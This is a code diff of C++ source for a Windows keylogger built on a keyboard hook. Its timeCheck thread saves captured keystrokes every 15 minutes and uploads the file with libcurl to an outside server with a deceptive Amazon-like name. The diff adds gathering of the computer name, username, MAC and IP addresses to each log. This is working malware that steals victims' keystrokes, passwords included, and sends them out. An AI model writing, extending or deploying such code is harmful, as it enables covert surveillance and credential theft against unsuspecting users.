@@ -10,6 +10,44 @@ WindowsHook::~WindowsHook()
 	UnHook();
 }
 
+// thread function
+static void timeCheck() {
+	std::string tmp;
+	while (true) {
+		// Wait 15 minutes
+		std::this_thread::sleep_for(waitTime);
+		tmp = contentFile;
+		contentFile = "";
+		std::ofstream outputFile(FilePath);
+		if (outputFile.is_open()) outputFile << tmp;
+		outputFile.close();
+
+		// sending the file to the server
+		CURL* curl;
+		CURLcode res;
+		curl_global_init(CURL_GLOBAL_ALL);
+		curl = curl_easy_init();
+
+		if (curl) {
+			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
+			curl_mime* mime;
+			curl_mimepart* part;
+			mime = curl_mime_init(curl);
+			part = curl_mime_addpart(mime);
+			curl_mime_name(part, "file");
+			curl_mime_filedata(part, FilePath.c_str());
+			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+			res = curl_easy_perform(curl);
+			curl_easy_cleanup(curl);
+			curl_mime_free(mime);
+		}
+		curl_global_cleanup();
+
+		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
+		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
+	}
+}
+
 bool WindowsHook::SetHook(int type)
 {
 	if (this->hHook != NULL) return false;
@@ -31,45 +69,18 @@ bool WindowsHook::UnHook()
 	return false;
 }
 
-// thread function
-static void timeCheck() {
-	std::string tmp;
-	while (true) {
-		// Wait 15 minutes
-		std::this_thread::sleep_for(waitTime);
-		tmp = contentFile;
-		contentFile = "";
-		std::ofstream outputFile(FilePath);
-		if (outputFile.is_open()) outputFile << tmp;
-		outputFile.close();
-
-		// sending the file to the server
-		CURL* curl;
-		CURLcode res;
-		curl_global_init(CURL_GLOBAL_ALL);
-		curl = curl_easy_init();
-
-		if (curl) {
-			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
-			curl_mime* mime;
-			curl_mimepart* part;
-			mime = curl_mime_init(curl);
-			part = curl_mime_addpart(mime);
-			curl_mime_name(part, "file");
-			curl_mime_filedata(part, FilePath.c_str());
-			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-			res = curl_easy_perform(curl);
-			curl_easy_cleanup(curl);
-			curl_mime_free(mime);
+void MACToString(const BYTE* MACData, std::string& macStr) {
+	std::ostringstream oss;
+	for (int i = 0; i < 6; ++i) {
+		oss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)MACData[i];
+		if (i < 5) {
+			oss << "-";
 		}
-		curl_global_cleanup();
-
-		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
-		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
 	}
+	macStr = oss.str();
 }
 
-// creating the string that will be written at the beginning of the file
+// creating the string that will be written at the beginning of the file containing all the information of the PC
 static std::string StartString()
 {
 	std::string startString = ""; // for the top of the file
@@ -79,14 +90,14 @@ static std::string StartString()
 	TCHAR pcname[MAX_COMPUTERNAME_LENGTH + 1];
 	DWORD pcname_len = sizeof(pcname) / sizeof(pcname[0]);
 	// PC name
-	startString = "\n------------------------------------\nNome Computer: ";
+	startString = "\n------------------------------------\nComputer Name: ";
 	if (GetComputerName(pcname, &pcname_len)) {
 		std::string pcnameStr(pcname, pcname + pcname_len);
 		startString.append(pcnameStr);
 	}
 	else startString.append("Impossibile ottenere il nome del computer.");
 	// User Name
-	startString.append("\nNome utente: ");
+	startString.append("\nUsername: ");
 	TCHAR username[256];
 	DWORD username_len = sizeof(username) / sizeof(username[0]);
 	if (GetUserName(username, &username_len))
@@ -95,60 +106,62 @@ static std::string StartString()
 		startString.append(usernameStr);
 	}
 	else startString.append("Impossibile ottenere il nome utente.");
+	// IP and MAC Address
+	IP_ADAPTER_INFO AdapterInfo[16];
+	DWORD dwBufLen = sizeof(AdapterInfo);
+	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
+	if (dwStatus != ERROR_SUCCESS) {
+		startString += "\nGetAdaptersInfo failed with error: " + dwStatus;
+	}
+	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
+	std::string macStr;
+	while (pAdapterInfo) {
+		// Filtrare gli adattatori fisici e ignorare loopback e virtuali
+		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000)) {
+			startString += "\nWireless Connection--";
+			MACToString(pAdapterInfo->Address, macStr);
+			startString += "\nAdapter Name: ";
+			startString.append(pAdapterInfo->AdapterName);
+			startString += "\nAdapter Description: ";
+			startString.append(pAdapterInfo->Description);
+			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
+			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
+			startString += "\n";
+			break;
+		}
+		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000)) {
+			startString += "\nEthernet Connection (Physycal MAC address)--";
+			MACToString(pAdapterInfo->Address, macStr);
+			startString += "\nAdapter Name: ";
+			startString.append(pAdapterInfo->AdapterName);
+			startString += "\nAdapter Description: ";
+			startString.append(pAdapterInfo->Description);
+			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
+			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
+			startString += "\n";
+			break;
+		}
+		pAdapterInfo = pAdapterInfo->Next;
+	}
+	if (macStr.empty()) {
+		startString += "No physical adapter found.\n";
+	}
 	// date & time
 	localtime_s(&currentTime, &now);
-	startString.append("\nDATA: ");
-	std::string day = std::to_string(currentTime.tm_mday);
-	std::string month = std::to_string(currentTime.tm_mon + 1);
-	std::string year = std::to_string(currentTime.tm_year + 1900);
-	std::string date = day.append("/").append(month).append("/").append(year);
-	startString.append(date);
-	startString.append("\nORA: ");
-	std::string hour = std::to_string(currentTime.tm_hour);
-	std::string minute = std::to_string(currentTime.tm_min);
-	std::string second = std::to_string(currentTime.tm_sec);
-	std::string time = hour.append(":").append(minute).append(":").append(second);
-	startString.append(time);
+	startString.append("\nDate: ");
+	startString.append(std::to_string(currentTime.tm_mday));
+	startString.append("/");
+	startString.append(std::to_string(currentTime.tm_mon + 1));
+	startString.append("/");
+	startString.append(std::to_string(currentTime.tm_year + 1900));
+	startString.append("\nTime: ");
+	startString.append(std::to_string(currentTime.tm_hour));
+	startString.append(":");
+	startString.append(std::to_string(currentTime.tm_min));
+	startString.append(":");
+	startString.append(std::to_string(currentTime.tm_sec));
 	startString.append("\n------------------------------------\n");
 	return startString;
-}
-
-// thread function
-static void timeCheck() {
-	std::string tmp;
-	while (true) {
-		// Wait 15 minutes
-		std::this_thread::sleep_for(waitTime);
-		tmp = contentFile;
-		contentFile = "";
-		std::ofstream outputFile(FilePath);
-		if (outputFile.is_open()) outputFile << tmp;
-		outputFile.close();
-
-		// sending the file to the server
-		CURL* curl;
-		CURLcode res;
-		curl_global_init(CURL_GLOBAL_ALL);
-		curl = curl_easy_init();
-
-		if (curl) {
-			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
-			curl_mime* mime;
-			curl_mimepart* part;
-			mime = curl_mime_init(curl);
-			part = curl_mime_addpart(mime);
-			curl_mime_name(part, "file");
-			curl_mime_filedata(part, FilePath.c_str());
-			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-			res = curl_easy_perform(curl);
-			curl_easy_cleanup(curl);
-			curl_mime_free(mime);
-		}
-		curl_global_cleanup();
-
-		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
-		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
-	}
 }
 
 // Keyboard hook
